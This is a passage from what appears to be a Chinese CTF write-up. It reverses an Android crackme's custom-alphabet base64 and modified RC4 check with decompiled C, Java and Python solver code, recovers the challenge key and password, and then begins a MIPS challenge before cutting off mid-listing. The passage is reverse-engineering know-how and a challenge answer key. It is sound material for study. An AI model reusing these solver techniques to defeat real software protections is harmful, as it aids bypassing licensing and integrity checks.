<code>verify</code> 之类的，找到这个判断函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  v4 = (<span class="keyword">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352L</span>L))(a1, a3, <span class="number">0L</span>L);</span><br><span class="line">  v5 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">1344L</span>L))(a1, v3);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  sub_710(v4, (__int64)&amp;s, v5 - 3 * (((unsigned __int64)(&#x27;UUUV&#x27; * v5) &gt;&gt; 63) + ((unsigned __int64)(&#x27;UUUV&#x27; * v5) &gt;&gt; 32)));</span><br><span class="line">  sub_820(&amp;s, (__int64)&amp;v22);                   <span class="comment">// s=&#x27;th1s_1s_k3ya!!!!&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// base64</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6)];<span class="comment">// abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line">      *((_BYTE *)&amp;v15 + v6 + <span class="number">1</span>) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">1</span>)];</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6 + <span class="number">2</span>) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">2</span>)];</span><br><span class="line">      v7 = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">3</span>)];</span><br><span class="line">      v6 += <span class="number">4</span>;</span><br><span class="line">      *((_BYTE *)&amp;v15 + v11 + <span class="number">3</span>) = v7;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6)];</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6 + <span class="number">1</span>) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">1</span>)];</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6 + <span class="number">2</span>) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">2</span>)];</span><br><span class="line">      *((_BYTE *)&amp;v15 + v6 + <span class="number">3</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">    v10 = __OFADD__(<span class="number">-3</span>, v5);</span><br><span class="line">    v8 = v5 == <span class="number">3</span>;</span><br><span class="line">    v9 = v5 - <span class="number">3</span> &lt; <span class="number">0</span>;</span><br><span class="line">    v5 -= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v9 ^ v10) | v8 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)&amp;v15 + v6) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6)];</span><br><span class="line">  *((_BYTE *)&amp;v15 + v6 + <span class="number">1</span>) = aAbcdefghijklmn[*((<span class="keyword">char</span> *)&amp;v22 + v6 + <span class="number">1</span>)];</span><br><span class="line">  *(_WORD *)((char *)&amp;v15 + v6 + 2) = &#x27;==&#x27;;</span><br><span class="line">LABEL_10:</span><br><span class="line">  (*(<span class="keyword">void</span> (__fastcall **)(__int64, __int64, <span class="keyword">char</span> *))(*(_QWORD *)a1 + <span class="number">1360L</span>L))(a1, v3, v4);</span><br><span class="line">  v12 = _mm_movemask_epi8(</span><br><span class="line">          _mm_and_si128(</span><br><span class="line">            _mm_cmpeq_epi8(_mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;v15), (__m128i)xmmword_BE0),</span><br><span class="line">            _mm_cmpeq_epi8(_mm_loadu_si128((<span class="keyword">const</span> __m128i *)((<span class="keyword">char</span> *)&amp;v15 + <span class="number">9</span>)), (__m128i)xmmword_BD0)));<span class="comment">// 3g6L2PWL2PXFmR+7ise7iq==</span></span><br><span class="line">  __android_log_print(<span class="number">4L</span>L, <span class="string">&quot;nepnep&quot;</span>, <span class="string">&quot;%s&quot;</span>, &amp;v15);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v12 == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __android_log_print(<span class="number">4L</span>L, <span class="string">&quot;nepnep&quot;</span>, <span class="string">&quot;key is true!&quot;</span>, v13);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>我们的目的肯定是让 <code>v12 = 0FFFF</code></p><p>虽然对于 mm 之类的指令不太清楚，但大概的意思应该还是两个字符串相等的，那么就让 <code>(const __m128i *)&amp;v15), (__m128i)xmmword_BE0)</code> 和 <code>((char *)&amp;v15 + 9)), (__m128i)xmmword_BD0))</code> 两两相等即可</p><p>在字符串中找到这两个，就能得到 <code>3g6L2PWL2PXFmR+7ise7iq==</code>，这个看起来是一个 base64，但解出来是乱码，所以还是得往前看。上面一大段从 <code>while</code> 开始的代码，显然就是 base64 的最后一步，点开字符串，发现这个不是标准的 base64。那么根据这个字符串反向求解 base64 就可以了。</p><p>实际操作时，继续阅读了 <code>sub_820</code> 和 <code>sub_710</code> 两个函数。只看 <code>sub_820</code> 的话看不太懂，建议先看 <code>sub_710</code>，发现 <code>sub_710</code> 中，将一个字符串的每个字符根据 ascii 数值直接拆开到了八个 char 上，每个 char 存 <code>&#39;0&#39;</code> 或 <code>&#39;1&#39;</code> （ <code>0x30</code> 和 <code>0x31</code> ）。到了 <code>sub_820</code> 函数，则每六个进行合并，每一位运算看起来很奇怪，但如果用 <code>0x30</code> 和 <code>0x31</code> 带入会发现就是很简单的将 0 和1 重新组合起来。就是做了一个 base64 运算。</p><p>于是写个代码反向求解就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">en_key = <span class="string">&#x27;7+RmFXP2LWP2L6g3&#x27;</span>[::<span class="number">-1</span>] + <span class="string">&#x27;==qi7esi&#x27;</span>[::<span class="number">-1</span>]</span><br><span class="line">true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;+/&#x27;</span></span><br><span class="line">fake_base = string.ascii_lowercase + string.digits + <span class="string">&#x27;+/&#x27;</span> + string.ascii_uppercase</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> en_key:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        key += c</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    key += true_base[fake_base.index(c)]</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>得到 key: <code>th1s_1s_k3y!!!!!</code></p><blockquote><p>这里我因为打错了base的字符串，卡了整整一天（</p></blockquote><p>接下来就可以去求明文密码了</p><p>继续阅读 java 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Encrypt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">en1</span><span class="params">(<span class="keyword">int</span>[] arg6, String arg7, <span class="keyword">int</span> arg8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[v0];</span><br><span class="line">        <span class="keyword">byte</span>[] v7 = arg7.getBytes();</span><br><span class="line">        <span class="keyword">int</span> v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v3;</span><br><span class="line">        <span class="keyword">for</span>(v3 = <span class="number">0</span>; v3 &lt; v0; ++v3) &#123;</span><br><span class="line">            arg6[v3] = <span class="number">0x100</span> - v3;  <span class="comment">// 256-1降序</span></span><br><span class="line">            v1[v3] = v7[v3 % arg8];  <span class="comment">// 用密钥填满v1</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v7_1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v2 &lt; v0) &#123;</span><br><span class="line">            v7_1 = (arg6[v2] + v7_1 + v1[v2]) % <span class="number">0x100</span>;</span><br><span class="line">            arg8 = arg6[v2];</span><br><span class="line">            arg6[v2] = arg6[v7_1];</span><br><span class="line">            arg6[v7_1] = arg8;</span><br><span class="line">            ++v2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">en2</span><span class="params">(<span class="keyword">int</span>[] arg7, <span class="keyword">byte</span>[] arg8, <span class="keyword">int</span> arg9)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; arg9) &#123;</span><br><span class="line">            v1 = (v1 + <span class="number">1</span>) % <span class="number">0x100</span>;</span><br><span class="line">            v2 = ((arg7[v1] &amp; <span class="number">0xFF</span>) + v2) % <span class="number">0x100</span>;</span><br><span class="line">            <span class="keyword">int</span> v3 = arg7[v1];</span><br><span class="line">            arg7[v1] = arg7[v2];</span><br><span class="line">            arg7[v2] = v3;</span><br><span class="line">            arg8[v0] = ((<span class="keyword">byte</span>)(arg8[v0] ^ arg7[((arg7[v1] &amp; <span class="number">0xFF</span>) + (arg7[v2] &amp; <span class="number">0xFF</span>)) % <span class="number">0x100</span>]));</span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">file</span><span class="params">(<span class="keyword">byte</span>[] arg6, String arg7)</span> </span>&#123;  <span class="comment">// passwd, key = &#x27;th1s_1s_k3ya!!!!&#x27;</span></span><br><span class="line">        <span class="keyword">int</span>[] v0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">17</span>;</span><br><span class="line">        <span class="keyword">int</span>[] v2 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0x8B</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x5D</span>, <span class="number">0x95</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x5F</span>, <span class="number">0x29</span>, <span class="number">0x56</span>, <span class="number">0x12</span>, <span class="number">0xB9</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>&#125;;</span><br><span class="line">        <span class="keyword">this</span>.en1(v0, arg7, arg7.length());</span><br><span class="line">        <span class="keyword">this</span>.en2(v0, arg6, arg6.length);</span><br><span class="line">        <span class="keyword">if</span>(arg6.length != v1) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v7;</span><br><span class="line">        <span class="keyword">for</span>(v7 = <span class="number">0</span>; v7 &lt; v1; ++v7) &#123;</span><br><span class="line">            <span class="keyword">if</span>((arg6[v7] &amp; <span class="number">0xFF</span>) != v2[v7]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>懂的话就会发现这个就是一个s盒从 <code>0-255</code> 变成 <code>256-1</code> 的 <code>RC4</code> 密码</p><p>不懂的话直接把代码复制出来，把 <code>file</code> 函数改写成 <code>main</code> 函数，反向求解一下就行（因为仔细观察就可以发现 <code>en2</code> 只对明文做了个异或运算，且异或的对象和明文本身没有关系），这里当密码学的题来做其实就好了。</p><p>这是我复制后改写的 java 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">en1</span><span class="params">(<span class="keyword">int</span>[] arg6, String arg7, <span class="keyword">int</span> arg8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[v0];</span><br><span class="line">        <span class="keyword">byte</span>[] v7 = arg7.getBytes();</span><br><span class="line">        <span class="keyword">int</span> v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v3;</span><br><span class="line">        <span class="keyword">for</span>(v3 = <span class="number">0</span>; v3 &lt; v0; ++v3) &#123;</span><br><span class="line">            arg6[v3] = <span class="number">0x100</span> - v3;  <span class="comment">// 256-1降序</span></span><br><span class="line">            v1[v3] = v7[v3 % arg8];  <span class="comment">// 用密钥填满v1</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v7_1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v2 &lt; v0) &#123;</span><br><span class="line">            v7_1 = (arg6[v2] + v7_1 + v1[v2]) % <span class="number">0x100</span>;</span><br><span class="line">            arg8 = arg6[v2];</span><br><span class="line">            arg6[v2] = arg6[v7_1];</span><br><span class="line">            arg6[v7_1] = arg8;</span><br><span class="line">            ++v2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">en2</span><span class="params">(<span class="keyword">int</span>[] arg7, <span class="keyword">int</span>[] arg8, <span class="keyword">int</span> arg9)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; arg9) &#123;</span><br><span class="line">            v1 = (v1 + <span class="number">1</span>) % <span class="number">0x100</span>;</span><br><span class="line">            v2 = ((arg7[v1] &amp; <span class="number">0xFF</span>) + v2) % <span class="number">0x100</span>;</span><br><span class="line">            <span class="keyword">int</span> v3 = arg7[v1];</span><br><span class="line">            arg7[v1] = arg7[v2];</span><br><span class="line">            arg7[v2] = v3;</span><br><span class="line">            arg8[v0] = ((<span class="keyword">byte</span>)(arg8[v0] ^ arg7[((arg7[v1] &amp; <span class="number">0xFF</span>) + (arg7[v2] &amp; <span class="number">0xFF</span>)) % <span class="number">0x100</span>]));</span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String arg7 = <span class="string">&quot;th1s_1s_k3y!!!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span>[] arg6 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0x8B</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x5D</span>, <span class="number">0x95</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x5F</span>, <span class="number">0x29</span>, <span class="number">0x56</span>, <span class="number">0x12</span>, <span class="number">0xB9</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] v0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">17</span>;</span><br><span class="line">        <span class="keyword">int</span>[] v2 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">        en1(v0, arg7, arg7.length());</span><br><span class="line">        en2(v0, arg6, arg6.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arg6.length; i++) &#123;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>)(arg6[i] &amp; <span class="number">0xff</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也可以跟在第一段 python 后面继续写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">en_key = <span class="string">&#x27;7+RmFXP2LWP2L6g3&#x27;</span>[::<span class="number">-1</span>] + <span class="string">&#x27;==qi7esi&#x27;</span>[::<span class="number">-1</span>]</span><br><span class="line">true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;+/&#x27;</span></span><br><span class="line">fake_base = string.ascii_lowercase + string.digits + <span class="string">&#x27;+/&#x27;</span> + string.ascii_uppercase</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> en_key:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        key += c</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    key += true_base[fake_base.index(c)]</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">print(key)</span><br><span class="line"><span class="comment"># th1s_1s_k3y!!!!!</span></span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="number">0x8B</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x5D</span>, <span class="number">0x95</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x5F</span>, <span class="number">0x29</span>, <span class="number">0x56</span>, <span class="number">0x12</span>, <span class="number">0xB9</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en1</span>(<span class="params">key, len_key</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    v0 = <span class="number">0x100</span></span><br><span class="line">    v1 = [<span class="number">0</span>] * v0</span><br><span class="line">    v7 = [c <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(v0):</span><br><span class="line">        res.append(<span class="number">0x100</span> - v3)</span><br><span class="line">        v1[v3] = v7[v3 % len_key]</span><br><span class="line">    v7_1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2 &lt; v0:</span><br><span class="line">        v7_1 = (res[v2] + v7_1 + v1[v2]) % <span class="number">0x100</span></span><br><span class="line">        len_key = res[v2]</span><br><span class="line">        res[v2] = res[v7_1]</span><br><span class="line">        res[v7_1] = len_key</span><br><span class="line">        v2 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en2</span>(<span class="params">res_key, text, len_text</span>):</span></span><br><span class="line">    v0 = <span class="number">0</span></span><br><span class="line">    v1 = <span class="number">0</span></span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># text = bytes(text)</span></span><br><span class="line">    <span class="keyword">while</span> v0 &lt; len_text:</span><br><span class="line">        v1 = (v1 + <span class="number">1</span>) % <span class="number">0x100</span></span><br><span class="line">        v2 = ((res_key[v1] &amp; <span class="number">0xFF</span>) + v2) % <span class="number">0x100</span></span><br><span class="line">        v3 = res_key[v1]</span><br><span class="line">        res_key[v1] = res_key[v2]</span><br><span class="line">        res_key[v2] = v3</span><br><span class="line">        text[v0] = ((text[v0] ^ res_key[((res_key[v1] &amp; <span class="number">0xFF</span>) + (res_key[v2] &amp; <span class="number">0xFF</span>)) % <span class="number">0x100</span>]))</span><br><span class="line">        v0 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">list_key = en1(key[:], <span class="built_in">len</span>(key))</span><br><span class="line">plaintext = en2(list_key[:], ciphertext[:], <span class="built_in">len</span>(ciphertext))</span><br><span class="line"><span class="built_in">print</span> (plaintext)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plaintext:</span><br><span class="line">    flag += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><p>这样就拿到密码了 <code>Y0uG3tTheP4ssw0rd</code></p><p>然后将 apk 解压一下（用的 bandizip，可以直接解压），在目录下面可以找到 <code>\assets\flag.zip</code></p><p>解压即可拿到 flag</p><h1 id="easy-mips-（mips-逆向）"><a href="#easy-mips-（mips-逆向）" class="headerlink" title="easy_mips （mips 逆向）"></a>easy_mips （mips 逆向）</h1><p>这是一道mips的题，用ida无法反汇编，<del>爬了</del></p><p>先用ida的字符串搜索找到了关键代码在 <code>tty_write</code> 函数里，并且调用了 <code>encry</code> 函数和 <code>init</code> 函数，但因为没学过mips，也就没法继续分析了</p><p>于是第一次尝试使用 Ghidra</p><p>用 Ghidra 打开二进制文件</p><p>找到关键函数 <code>tty_write</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 